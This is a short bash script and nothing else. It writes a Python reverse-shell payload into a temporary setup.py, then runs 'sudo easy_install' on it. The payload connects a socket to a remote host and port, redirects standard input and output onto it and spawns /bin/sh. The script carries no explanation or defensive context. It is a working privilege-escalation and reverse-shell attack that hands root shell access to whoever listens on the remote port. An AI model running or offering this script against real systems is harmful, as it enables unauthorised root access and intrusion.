#!/bin/bash

export RHOST=0.0.0.0
export RPORT=5253
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect(("'$RHOST'",int('$RPORT')))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' > $TF/setup.py
sudo easy_install $TF
